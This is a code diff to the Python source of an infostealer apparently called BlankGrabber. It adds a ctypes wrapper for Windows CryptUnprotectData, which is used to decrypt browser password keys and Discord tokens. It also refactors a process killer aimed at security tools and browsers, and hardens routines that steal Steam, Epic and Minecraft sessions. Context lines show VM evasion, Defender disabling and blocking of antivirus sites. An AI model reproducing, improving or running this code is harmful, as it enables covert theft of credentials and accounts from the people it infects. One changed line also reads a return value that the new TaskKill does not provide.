@@ -15,18 +15,15 @@ import sqlite3
 import re
 import traceback
 import time
+import ctypes
 
 from threading import Thread
 from functools import reduce
 from urllib3 import PoolManager, HTTPResponse
-from DPAPI import CryptUnprotectData
 import PIL.ImageGrab as ImageGrab, PIL.Image as Image, PIL.ImageStat as ImageStat
 
 if not hasattr(sys, "_MEIPASS"):
     sys._MEIPASS = os.path.dirname(os.path.abspath(__file__)) # Sets _MEIPASS if does not exist (py mode)
-
-if os.getenv("BG-DEBUG", True): # Set environment variable `BG-DEBUG` to False to prevent error messages from being displayed
-    print = lambda x: None
 
 class Settings:
 
@@ -102,17 +99,8 @@ class VmProtect:
         return (r1.returncode != 1 and r2.returncode != 1) or gpucheck or dircheck
 
     @staticmethod
-    def killTasks(*tasks: str) -> None: # Kills blacklisted processes
-        out = (subprocess.run('tasklist /FO LIST', shell= True, capture_output= True).stdout.decode(errors= 'ignore')).strip().split('\r\n\r\n')
-        for i in out:
-            i = i.split("\r\n")[:2]
-            try:
-                name, pid = i[0].split()[-1].rstrip('.exe'), int(i[1].split()[-1])
-                if not name in (tasks or VmProtect.BLACKLISTED_TASKS):
-                    continue
-                subprocess.Popen('taskkill /F /PID %d' % pid, shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
-            except Exception:
-                pass
+    def killTasks() -> None: # Kills blacklisted processes
+        Utility.TaskKill(*VmProtect.BLACKLISTED_TASKS)
 
     @staticmethod
     def isVM() -> bool: # Checks if the user is running on a VM or not
@@ -150,6 +138,34 @@ class Tasks:
         for thread in Tasks.threads:
             thread.join()
 
+class Syscalls:
+    
+    @staticmethod
+    def CryptUnprotectData(encrypted_data: bytes, optional_entropy: str= None) -> bytes: # Calls the CryptUnprotectData function from crypt32.dll
+
+        class DATA_BLOB(ctypes.Structure):
+
+            _fields_ = [
+                ("cbData", ctypes.c_ulong),
+                ("pbData", ctypes.POINTER(ctypes.c_ubyte))
+            ]
+        
+        pDataIn = DATA_BLOB(len(encrypted_data), ctypes.cast(encrypted_data, ctypes.POINTER(ctypes.c_ubyte)))
+        pDataOut = DATA_BLOB()
+        pOptionalEntropy = None
+
+        if optional_entropy is not None:
+            optional_entropy = optional_entropy.encode("utf-16")
+            pOptionalEntropy = DATA_BLOB(len(optional_entropy), ctypes.cast(optional_entropy, ctypes.POINTER(ctypes.c_ubyte)))
+
+        if ctypes.windll.Crypt32.CryptUnprotectData(ctypes.byref(pDataIn), None, ctypes.byref(pOptionalEntropy) if pOptionalEntropy is not None else None, None, None, 0, ctypes.byref(pDataOut)):
+            data = (ctypes.c_ubyte * pDataOut.cbData)()
+            ctypes.memmove(data, pDataOut.pbData, pDataOut.cbData)
+            ctypes.windll.Kernel32.LocalFree(pDataOut.pbData)
+            return bytes(data)
+
+        raise ValueError("Invalid encrypted_data provided!")
+
 class Utility:
 
     @staticmethod
@@ -158,6 +174,20 @@ class Utility:
             return (sys.executable, True)
         else:
             return (__file__, False)
+        
+    @staticmethod
+    def TaskKill(*tasks: str) -> None: # Tries to kill given processes
+        tasks = list(map(lambda x: x.lower(), tasks))
+        out = (subprocess.run('tasklist /FO LIST', shell= True, capture_output= True).stdout.decode(errors= 'ignore')).strip().split('\r\n\r\n')
+        for i in out:
+            i = i.split("\r\n")[:2]
+            try:
+                name, pid = i[0].split()[-1], int(i[1].split()[-1])
+                name = name [:-4] if name.endswith(".exe") else name
+                if name.lower() in tasks:
+                    subprocess.run('taskkill /F /PID %d' % pid, shell= True, capture_output= True)
+            except Exception:
+                pass
 
     @staticmethod
     def DisableDefender() -> None: # Tries to disable the defender
@@ -231,7 +261,7 @@ class Utility:
         folders = (os.path.join(path, x) for x in contents if os.path.isdir(os.path.join(path, x)))
         files = (os.path.join(path, x) for x in contents if os.path.isfile(os.path.join(path, x)))
 
-        body = [TEE for _ in range(len(os.listdir(path)) - 1)] + [ELBOW]
+        body = [TEE for _ in range(len(contents) - 1)] + [ELBOW]
         count = 0
 
         for item in folders:
@@ -363,7 +393,7 @@ class Browsers:
                     encryptedKey: str = jsonContent["os_crypt"]["encrypted_key"]
                     encryptedKey = base64.b64decode(encryptedKey.encode())[5:]
 
-                    self.EncryptionKey = CryptUnprotectData(encryptedKey)
+                    self.EncryptionKey = Syscalls.CryptUnprotectData(encryptedKey)
                     return self.EncryptionKey
 
                 else:
@@ -378,7 +408,7 @@ class Browsers:
 
                 return pyaes.AESModeOfOperationGCM(key, iv).decrypt(cipherText)[:-16].decode()
             else:
-                return str(CryptUnprotectData(buffer))
+                return str(Syscalls.CryptUnprotectData(buffer))
         
         def GetPasswords(self) -> list[tuple[str, str, str]]: # Gets all passwords from the browser
             encryptionKey = self.GetEncryptionKey()
@@ -401,7 +431,10 @@ class Browsers:
                     if not os.path.isfile(tempfile):
                         break
                 
-                shutil.copy(path, tempfile)
+                try:
+                    shutil.copy(path, tempfile)
+                except Exception:
+                    continue
                 db = sqlite3.connect(tempfile)
                 db.text_factory = lambda b : b.decode(errors= "ignore")
                 cursor = db.cursor()
@@ -444,7 +477,10 @@ class Browsers:
                     if not os.path.isfile(tempfile):
                         break
                 
-                shutil.copy(path, tempfile)
+                try:
+                    shutil.copy(path, tempfile)
+                except Exception:
+                    continue
                 db = sqlite3.connect(tempfile)
                 db.text_factory = lambda b : b.decode(errors= "ignore")
                 cursor = db.cursor()
@@ -483,7 +519,10 @@ class Browsers:
                     if not os.path.isfile(tempfile):
                         break
                 
-                shutil.copy(path, tempfile)
+                try:
+                    shutil.copy(path, tempfile)
+                except Exception:
+                    continue
                 db = sqlite3.connect(tempfile)
                 db.text_factory = lambda b : b.decode(errors= "ignore")
                 cursor = db.cursor()
@@ -686,7 +725,7 @@ class Discord:
         
         for token in encryptedTokens:
             try:
-                token = pyaes.AESModeOfOperationGCM(CryptUnprotectData(key), token[3:15]).decrypt(token[15:])[:-16].decode(errors= "ignore")
+                token = pyaes.AESModeOfOperationGCM(Syscalls.CryptUnprotectData(key), token[3:15]).decrypt(token[15:])[:-16].decode(errors= "ignore")
                 if token:
                     tokens.append(token)
             except Exception:
@@ -859,9 +898,12 @@ class BlankGrabber:
 
             for name, path in minecraftPaths.items():
                 if os.path.isfile(path):
-                    os.makedirs(os.path.join(saveToPath, name), exist_ok= True)
-                    shutil.copy(path, os.path.join(saveToPath, name, os.path.basename(path)))
-                    self.MinecraftSessions += 1
+                    try:
+                        os.makedirs(os.path.join(saveToPath, name), exist_ok= True)
+                        shutil.copy(path, os.path.join(saveToPath, name, os.path.basename(path)))
+                        self.MinecraftSessions += 1
+                    except Exception:
+                        continue
                     
     @Errors.Catch
     def StealEpic(self) -> None: #Steals Epic accounts
@@ -874,12 +916,12 @@ class BlankGrabber:
                     with open(loginFile) as file:
                         contents = file.read()
                     if "[RememberMe]" in contents:
-                        os.makedirs(saveToPath, exist_ok= True)
-                        shutil.copytree(epicPath, saveToPath, dirs_exist_ok= True)
-                        self.EpicCount += 1
-    # The section above pulls the entire directory of files which is where the one required file is located.
-    # The only file needed to be replaced in order to login is "GameUserSettings.ini".
-    # In the future, the other files may be needed to login if Epic updates client security.
+                        try:
+                            os.makedirs(saveToPath, exist_ok= True)
+                            shutil.copytree(epicPath, saveToPath, dirs_exist_ok= True)
+                            self.EpicCount += 1
+                        except Exception:
+                            pass
     
     @Errors.Catch
     def StealSteam(self) -> None: # Steals Steam accounts
@@ -892,9 +934,12 @@ class BlankGrabber:
                     with open(loginFile) as file:
                         contents = file.read()
                     if '"RememberPassword"\t\t"1"' in contents:
-                        os.makedirs(saveToPath, exist_ok= True)
-                        shutil.copytree(steamPath, saveToPath, dirs_exist_ok= True)
-                        self.SteamCount += 1
+                        try:
+                            os.makedirs(saveToPath, exist_ok= True)
+                            shutil.copytree(steamPath, saveToPath, dirs_exist_ok= True)
+                            self.SteamCount += 1
+                        except Exception:
+                            pass
     
     @Errors.Catch
     def StealRobloxCookies(self) -> None: # Steals Roblox cookies
@@ -1099,7 +1144,7 @@ class BlankGrabber:
     def BlockSites(self) -> None: # Initiates blocking of AV related sites and kill any browser instance for them to reload the hosts file
         if Settings.BlockAvSites:
             Utility.BlockSites()
-            VmProtect.killTasks("chrome", "firefox", "msedge", "safari", "opera", "iexplore")
+            Utility.TaskKill("chrome", "firefox", "msedge", "safari", "opera", "iexplore")
     
     @Errors.Catch
     def StealBrowserData(self) -> None: # Steal cookies, passwords and history from the browsers
@@ -1124,6 +1169,7 @@ class BlankGrabber:
             if os.path.isdir(path):
                 def run(name, path):
                     try:
+                        Utility.TaskKill(name)
                         browser = Browsers.Chromium(path)
                         saveToDir = os.path.join(self.TempFolder, "Credentials", name)
 
@@ -1153,8 +1199,8 @@ class BlankGrabber:
                                     file.write(self.Separator.lstrip() + self.Separator.join(output))
                                 self.History.extend(history)
 
-                    except Exception as e:
-                        return
+                    except Exception:
+                        pass
 
                 t = Thread(target= run, args= (name, path))
                 t.start()
@@ -1215,11 +1261,11 @@ class BlankGrabber:
             dirs = []
             has_key_datas = False
 
-            process = subprocess.run(r"reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall", shell= True, capture_output= True)
+            process = subprocess.run("reg query HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall", shell= True, capture_output= True)
             if process.returncode == 0:
                 paths = [x for x in process.stdout.decode(errors= "ignore").splitlines() if x.strip()]
                 for path in paths:
-                    process = subprocess.run(r'reg query "{}" /v DisplayIcon'.format(path), shell= True, capture_output= True)
+                    process = subprocess.run('reg query "{}" /v DisplayIcon'.format(path), shell= True, capture_output= True)
                     if process.returncode == 0:
                         path = process.stdout.strip().decode().split(" " * 4)[-1].split(",")[0]
                         if "telegram" in path.lower():
@@ -1283,7 +1329,7 @@ class BlankGrabber:
             if paths is not None:
                 for dir in paths:
                     appname = os.path.basename(dir)
-                    killTask = subprocess.run('taskkill /F /IM {}.exe'.format(appname), shell= True, capture_output= True)
+                    killTask = Utility.TaskKill(appname)
                     if killTask.returncode == 0:
                         for root, _, files in os.walk(dir):
                             for file in files:
